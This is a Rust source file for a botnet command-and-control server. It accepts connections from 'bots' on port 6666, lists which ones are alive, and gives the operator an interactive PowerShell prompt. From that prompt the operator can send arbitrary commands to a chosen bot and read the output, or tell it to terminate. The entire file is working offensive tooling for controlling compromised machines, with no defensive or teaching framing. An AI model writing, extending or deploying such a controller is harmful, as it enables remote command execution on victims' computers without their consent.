use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::thread;
pub fn help_menu() {
    println!(
        "List bots           bots
Interact to bot     interact
Which one:"
    );
}

pub fn srv() {
    // Create a map to store the list of connected bots
    let bots: Arc<Mutex<HashMap<String, TcpStream>>> = Arc::new(Mutex::new(HashMap::new()));
    // Create a thread-safe reference to the list of bots
    let bots_clone = bots.clone();

    // Start a new thread to listen for incoming connections
    thread::spawn(move || {
        let listener = TcpListener::bind("0.0.0.0:6666").unwrap();
        // Accept connections in a loop
        for stream in listener.incoming() {
            let stream = stream.unwrap();
            // Add the new bot to the list of connected bots
            let mut bots = bots_clone.lock().unwrap();
            let bot_id = stream.peer_addr().unwrap().to_string();

            bots.insert(bot_id, stream);
        }
    });
    'main_loop: loop {
        let mut input = String::new();
        println!("🔗> Maybe help: ");
        std::io::stdin().read_line(&mut input).unwrap();
        match input.trim() {
            "help" => help_menu(),
            "bots" => {
                let mut buffer = [0; 1024];
                //list all bots
                let bots = bots.lock().unwrap();
                if bots.is_empty() == true {
                    println!("Bot not found");
                    continue 'main_loop;
                } else {
                    for (i, (bot_id, mut stream)) in bots.iter().enumerate() {
                        if stream.write_all("wbu".as_bytes()).is_err() {
                            println!("{}: {} - Dead", i, bot_id);
                        } else {
                            stream.read(&mut buffer).unwrap();
                            println!("{}: {} - Active", i, bot_id);
                        }
                    }
                }
            }
            "interact" => {
                //interact to bot
                let mut bots = bots.lock().unwrap();
                let mut input = String::new();
                println!("🔗> Enter bot number you want to interact or back menu(exit): ");
                std::io::stdin().read_line(&mut input).expect("Wrong Input");
                if input.trim() == "quit" {
                    continue 'main_loop;
                } else {
                    let bot_index: usize = input.trim().parse().unwrap();
                    let selected_bot = bots.values().nth(bot_index);
                    'bot_loop: loop {
                        let mut buffer = [0; 99999];
                        if let Some(mut stream) = selected_bot {
                            let mut input = String::new();
                            println!("🔗Powershell Prompt> ");
                            std::io::stdin().read_line(&mut input).unwrap();
                            if input.trim() == "exit" {
                                continue 'main_loop;
                            } else if input.trim() == "kill" {
                                let selected_bot = bots.values().nth(bot_index);
                                let mut sel_bot = String::new();
                                for addr in selected_bot.into_iter() {
                                    sel_bot = addr.peer_addr().unwrap().to_string();
                                }
                                if let Some(mut stream) = selected_bot {
                                    stream.write_all("kill".as_bytes()).unwrap();
                                    bots.remove(&sel_bot);
                                    continue 'main_loop;
                                }
                            } else if stream.write_all(input.as_bytes()).is_err() {
                                println!("Connection Closed");
                                continue 'main_loop;
                            } else {
                                stream.read(&mut buffer).unwrap();
                                println!("{}", String::from_utf8_lossy(&buffer[..]));
                                continue 'bot_loop;
                            }
                        } else {
                            println!("Bot not found");
                            continue 'main_loop;
                        }
                    }
                }
            }
            _ => println!("Wrong choice"),
        }
    }
}
